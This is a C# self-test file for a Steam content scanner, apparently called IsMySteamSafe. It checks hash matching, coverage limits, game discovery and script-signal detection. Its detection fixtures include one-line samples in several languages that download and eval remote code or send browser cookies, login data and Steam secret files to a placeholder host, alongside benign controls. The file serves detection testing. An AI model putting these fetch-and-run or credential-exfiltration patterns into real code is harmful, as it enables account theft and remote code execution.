using System.Security.Cryptography;
using IsMySteamSafe.Core.Inspection;
using IsMySteamSafe.Core.Models;
using IsMySteamSafe.Core.Steam;

namespace IsMySteamSafe.SelfTest;

internal static partial class Program
{
    private static async Task TestAllFormatHashCoverageAsync()
    {
        string root = NewDetectionFixture();
        try
        {
            string[] names = ["entry.cs", "entry.csx", "payload.unknown", "bytecode.pyc", "shortcut.lnk", "archive.zip"];
            Dictionary<string, KnownContentRule> rules = new(StringComparer.OrdinalIgnoreCase);
            foreach (string name in names)
            {
                byte[] inert = System.Text.Encoding.UTF8.GetBytes("This is an inert exact-hash fixture: " + name);
                await File.WriteAllBytesAsync(Path.Combine(root, name), inert);
                string hash = Convert.ToHexString(SHA256.HashData(inert));
                rules[hash] = new("test-" + name, hash, "无害测试指纹", false);
            }
            AuditReport report = new();
            AuditCheckResult check = await LightContentAuditor.AuditAsync(DetectionLayout(root), report, default, knownRules: rules);
            Assert(report.Findings.Count == names.Length && report.Findings.All(f => f.Level == AuditLevel.NeedsReview && f.EvidenceState == "file-present"), "C#, unknown extension or opaque format bypassed exact hash matching");
            Assert(names.All(name => report.Findings.Any(f => f.Target == Path.Combine(root, name))), "not every extension was matched");
            Assert(check.Summary.Contains("完成 6 个 SHA-256"), "hash coverage counter is not explicit");
            Assert(report.ContentLimitations.Any(l => l.Kind.Contains("字节码")) && report.ContentLimitations.Any(l => l.Kind.Contains("快捷方式")) &&
                report.ContentLimitations.Any(l => l.Kind.Contains("压缩")) && report.ContentLimitations.Any(l => l.Kind.Contains("未做语义")), "opaque formats lack their remaining coverage boundary");
        }
        finally { RemoveDetectionFixture(root); }
    }

    private static async Task TestUnsupportedContentCoverageAsync()
    {
        string root = NewDetectionFixture();
        try
        {
            await File.WriteAllTextAsync(Path.Combine(root, "unknown.custom"), "inert unknown format");
            await File.WriteAllBytesAsync(Path.Combine(root, "invalid.cs"), [0, 0xff, 0xfe, 0, 0x42]);
            await File.WriteAllTextAsync(Path.Combine(root, "large.cs"), new string(' ', 2 * 1024 * 1024 + 1));
            using (FileStream large = File.Create(Path.Combine(root, "oversize.opaque"))) large.SetLength(64L * 1024 * 1024 + 1);
            AuditReport report = new();
            AuditCheckResult check = await LightContentAuditor.AuditAsync(DetectionLayout(root), report, default, knownRules: new Dictionary<string, KnownContentRule>());
            Assert(check.Level == AuditLevel.Information && report.Findings.Count == 0, "unexamined formats were declared Passed or malware");
            Assert(report.ContentLimitations.Any(l => l.Kind.Contains("未做语义")) && report.ContentLimitations.Any(l => l.Kind.Contains("编码")) &&
                report.ContentLimitations.Any(l => l.Kind.Contains("静态分析大小")) && report.ContentLimitations.Any(l => l.Kind.Contains("文件大小")), "format, encoding or size boundary was omitted");
            AuditReport limited = new();
            AuditCheckResult budget = await LightContentAuditor.AuditAsync(DetectionLayout(root), limited, default, maximumBytes: 1);
            Assert(budget.Level != AuditLevel.Passed && limited.ContentLimitations.Any(l => l.Detail.Contains("尚未完整")), "read budget was silently treated as safe");
        }
        finally { RemoveDetectionFixture(root); }
    }

    private static async Task TestFairContentRootBudgetAsync()
    {
        string root = NewDetectionFixture();
        try
        {
            string workshop = Path.Combine(root, "workshop"), game = Path.Combine(root, "game"), mod = Path.Combine(root, "mod");
            foreach (string directory in new[] { workshop, game, mod }) Directory.CreateDirectory(directory);
            for (int i = 0; i < 20; i++) await File.WriteAllTextAsync(Path.Combine(workshop, $"a{i:D2}.cs"), "// inert workshop fixture");
            await File.WriteAllTextAsync(Path.Combine(mod, "mod.cs"), "// inert mod fixture");
            string target = Path.Combine(game, "entry.cs"); await File.WriteAllTextAsync(target, "// inert game match");
            string hash = Convert.ToHexString(SHA256.HashData(await File.ReadAllBytesAsync(target)));
            SteamLayout layout = new();
            layout.ContentRoots.Add(new(workshop, "1118200", "workshop", "first discovered"));
            layout.ContentRoots.Add(new(game, "1234", "game", "installed game"));
            layout.ContentRoots.Add(new(mod, "1234", "mod", "installed mod"));
            AuditReport report = new();
            await LightContentAuditor.AuditAsync(layout, report, default, maximumEntries: 2,
                knownRules: new Dictionary<string, KnownContentRule> { [hash] = new("game-fixture", hash, "无害测试指纹", false) });
            Assert(report.Findings.Any(f => f.Target == target), "busy first workshop starved the installed game");
            Assert(report.ContentSources.Count == 3 && report.ContentLimitations.Any(l => l.Target == workshop && l.Detail.Contains("0 个文件")), "unvisited source root was omitted from coverage");
            AuditReport zero = new(); await LightContentAuditor.AuditAsync(layout, zero, default, maximumTime: TimeSpan.Zero);
            Assert(zero.ContentSources.Count == 3 && zero.ContentLimitations.Count(l => l.Kind.Contains("时间")) == 3, "zero-time deadline hides later roots");
            using CancellationTokenSource canceled = new(); canceled.Cancel();
            bool threw = false;
            try { await LightContentAuditor.AuditAsync(layout, new AuditReport(), canceled.Token); }
            catch (OperationCanceledException) { threw = true; }
            Assert(threw, "user cancellation was converted to successful bounded coverage");
        }
        finally { RemoveDetectionFixture(root); }
    }

    private static async Task TestInstalledGameDiscoveryAsync()
    {
        string root = NewDetectionFixture();
        try
        {
            string steamapps = Path.Combine(root, "steamapps"), game = Path.Combine(steamapps, "common", "OrdinaryGame");
            Directory.CreateDirectory(Path.Combine(game, "Mods"));
            await File.WriteAllTextAsync(Path.Combine(steamapps, "appmanifest_1234.acf"), "\"appid\" \"1234\" \"name\" \"Ordinary game\" \"installdir\" \"OrdinaryGame\"");
            await File.WriteAllTextAsync(Path.Combine(steamapps, "appmanifest_1235.acf"), "\"appid\" \"1235\" \"installdir\" \"../outside\"");
            SteamLayout layout = new(); layout.LibraryRoots.Add(root); ContentDiscovery.Populate(layout);
            Assert(layout.Games.Count == 1 && layout.ContentRoots.Any(r => r.Kind == "game" && r.Path == game), "ordinary installed-game directory was not included");
            Assert(layout.ContentRoots.Any(r => r.Kind == "mod" && r.AppId == "1234") && layout.ContentRoots.All(r => !r.Path.Contains("outside")), "mod discovery or unsafe-manifest rejection regressed");
        }
        finally { RemoveDetectionFixture(root); }
    }

    private static void TestCrossLanguageContentSignals()
    {
        (string Extension, string Source)[] fixtures =
        [
            (".cs", "var bytes = await client.GetByteArrayAsync(\"https://example.invalid/inert\"); Assembly.Load(bytes);"),
            (".csx", "client.DownloadFile(\"https://example.invalid/inert\", \"fixture.exe\"); Process.Start(\"fixture.exe\");"),
            (".js", "fetch('https://example.invalid/inert').then(x => x.text()).then(x => eval(x));"),
            (".py", "data = requests.get('https://example.invalid/inert').text\nexec(data)"),
            (".lua", "http.Fetch('https://example.invalid/inert', function(body) RunString(body) end)"),
            (".cs", "var data = File.ReadAllBytes(\"Login Data\"); await client.PostAsync(\"https://example.invalid/inert\", data);"),
            (".js", "const data = fs.readFileSync('Cookies'); axios.post('https://example.invalid/inert', data);"),
            (".py", "data = open('loginusers.vdf').read()\nrequests.post('https://example.invalid/inert', data=data)"),
            (".lua", "local data = file.Read('shared_secret', 'DATA'); http.Post('https://example.invalid/inert', {value=data})"),
            (".cs", "File.Copy(\"fixture.cs\", \"steamapps/workshop/content/1118200/123/fixture.cs\");"),
            (".py", "shutil.rmtree('steamapps/workshop/content/1118200/123')")
        ];
        foreach (var fixture in fixtures)
            Assert(ScriptSignals.Analyze(fixture.Source, fixture.Extension).Count > 0, "missing bounded combination for " + fixture.Extension + ": " + fixture.Source);
    }

    private static void TestContentSignalNegativeControls()
    {
        (string Extension, string Source)[] safe =
        [
            (".cs", "var doc = \"https://example.invalid/help\"; var type = typeof(Plugin).GetType(); Assembly.Load(localBytes);"),
            (".cs", "// client.DownloadFile(\"https://example.invalid/inert\", \"fixture.exe\"); Process.Start(\"fixture.exe\");"),
            (".js", "const help = \"fetch('url'); eval(data)\";"),
            (".py", "# data=requests.get('url').text; exec(data)\nprint('normal mod')"),
            (".lua", "--[[ http.Fetch('url', function(body) RunString(body) end) ]]\nprint('normal mod')"),
            (".lua", "--[=[ documentation\nhttp.Fetch('url', function(body) RunString(body) end)\n]=]\nprint('normal mod')"),
            (".lua", "local docs = [[ http.Fetch('url', function(body) RunString(body) end) ]]"),
            (".js", "fetch('https://example.invalid/version.json'); child_process.exec('git --version');"),
            (".cs", "var version = await client.GetStringAsync(\"https://example.invalid/version\"); Process.Start(\"steam.exe\");"),
            (".cs", "var data = File.ReadAllText(\"settings.json\"); client.PostAsync(\"https://example.invalid/settings\", data);"),
            (".lua", "file.Copy('texture.png', 'steamapps/workshop/content/1118200/123/texture.png')"),
            (".cs", "var local = client.GetByteArrayAsync(\"https://example.invalid/inert\");" + new string(' ', 6000) + "Assembly.Load(localBytes);"),
            (".cs", "var literal = @\"GetByteArrayAsync('url'); Assembly.Load(bytes);\";")
        ];
        foreach (var fixture in safe)
            Assert(ScriptSignals.Analyze(fixture.Source, fixture.Extension).Count == 0, "benign/comment/string/unrelated combination raised a signal: " + fixture.Source[..Math.Min(200, fixture.Source.Length)]);
        Assert(ScriptSignals.Analyze(new string(' ', 2 * 1024 * 1024) + "fetch('url');eval(body);", ".js").Count == 0, "script analysis read beyond its documented bound");
    }

    private static async Task TestCSharpStaticReviewOnlyAsync()
    {
        string root = NewDetectionFixture();
        try
        {
            await File.WriteAllTextAsync(Path.Combine(root, "inert.cs"), "var bytes = client.GetByteArrayAsync(\"https://example.invalid/not-contacted\"); Assembly.Load(bytes);");
            AuditReport report = new();
            await LightContentAuditor.AuditAsync(DetectionLayout(root), report, default, knownRules: new Dictionary<string, KnownContentRule>());
            Assert(report.Findings.Count == 1 && report.Findings[0].Level == AuditLevel.NeedsReview && report.Findings[0].EvidenceState == "file-present", "static C# combination claimed malware or execution instead of review");
            Assert(report.Findings[0].Meaning.Contains("不能证明恶意") && !File.Exists(Path.Combine(root, "not-contacted")), "static evidence boundary is missing");
        }
        finally { RemoveDetectionFixture(root); }
    }

    private static string NewDetectionFixture()
    {
        string root = Path.Combine(Path.GetTempPath(), "IsMySteamSafe-Detection-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(root); return root;
    }

    private static SteamLayout DetectionLayout(string root)
    {
        SteamLayout layout = new(); layout.ContentRoots.Add(new(root, "1118200", "workshop", "inert fixture")); return layout;
    }

    private static void RemoveDetectionFixture(string root)
    {
        if (ContentDiscovery.IsWithin(root, Path.GetTempPath()) && ContentDiscovery.IsLocalSafePath(root)) Directory.Delete(root, true);
    }
}
